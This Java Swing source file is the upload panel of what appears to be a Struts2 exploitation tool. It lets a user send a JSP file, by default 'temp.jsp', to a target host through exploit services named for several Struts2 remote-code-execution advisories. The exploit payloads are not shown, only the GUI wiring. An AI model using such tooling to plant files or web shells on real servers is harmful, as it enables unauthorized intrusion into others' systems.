package org.vti.ui;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;

import org.vti.enumeration.Version;
import org.vti.service.ExploitService;
import org.vti.service.impl.Struts2_S016_ExploitServiceImpl;
import org.vti.service.impl.Struts2_S019_ExploitServiceImpl;
import org.vti.service.impl.Struts2_S032_ExploitServiceImpl;
import org.vti.service.impl.Struts2_S038_ExploitServiceImpl;
import org.vti.service.impl.Struts2_S09_ExploitServiceImpl;
import org.vti.util.SystemUitls;

public class UploadPanel extends JPanel implements ActionListener{

	private static final long serialVersionUID = 1L;
	
	private JTextField fileJTextField;
	private JButton uploadJButton;
	private JTextPane textPane;
	
	private String host;
	private Version version;

	
	public UploadPanel() {
		setSize(600,460);
		setVisible(true);
		
		JLabel cmdJLabel = new JLabel("NAME");
		
		fileJTextField = new JTextField("temp.jsp");
		fileJTextField.setColumns(10);
		
		uploadJButton = new JButton("上传");
		uploadJButton.addActionListener(this);
		
		textPane = new JTextPane();
		textPane.setText(SystemUitls.getText());
		
		JScrollPane scrollPane=new JScrollPane(textPane);
		
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 580, Short.MAX_VALUE)
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(cmdJLabel)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(fileJTextField, GroupLayout.DEFAULT_SIZE, 470, Short.MAX_VALUE)
							.addGap(20)
							.addComponent(uploadJButton, GroupLayout.PREFERRED_SIZE, 60, GroupLayout.PREFERRED_SIZE)))
					.addContainerGap())
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(cmdJLabel)
						.addComponent(fileJTextField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(uploadJButton))
					.addGap(10)
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 410, Short.MAX_VALUE)
					.addContainerGap())
		);
		setLayout(groupLayout);
		setVisible(true);
	}

	@Override
	public void actionPerformed(ActionEvent e) {
	
		if (e.getSource()==uploadJButton) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					request();
				}
			}).start();
		}
	}
	
	private void request(){
		try {
			String name=fileJTextField.getText().trim();
			if (host!=null&&name.length()>0) {
				
				ExploitService service=null;
				
				switch (version) {
				case S2009:
					service=new Struts2_S09_ExploitServiceImpl();
					break;
				case S2016:
					service=new Struts2_S016_ExploitServiceImpl();
					break;
				case S2019:
					service=new Struts2_S019_ExploitServiceImpl();
					break;
				case S2032:
					service=new Struts2_S032_ExploitServiceImpl();
					break;
				default:
					service=new Struts2_S038_ExploitServiceImpl();
					break;
				}
				
				boolean flag= service.doUpload(host, name, textPane.getText());
				
				if (flag) {
					JOptionPane.showMessageDialog(this, "恭喜你,上传成功!","消息", JOptionPane.INFORMATION_MESSAGE);
				}else {
					JOptionPane.showMessageDialog(this, "对不起,上传失败!", "消息", JOptionPane.ERROR_MESSAGE);
				}
				
			}else {
				JOptionPane.showMessageDialog(this, "请输入文件路径");
			}
		} catch (Exception exp) {
			exp.printStackTrace();
			JOptionPane.showMessageDialog(this, "对不起,上传失败!", "消息", JOptionPane.ERROR_MESSAGE);
		}
	}
	
	public void setReqestUrl(String host){
		this.host=host;
	}
	
	public void setVersion(Version version){
		this.version=version;
	}
}
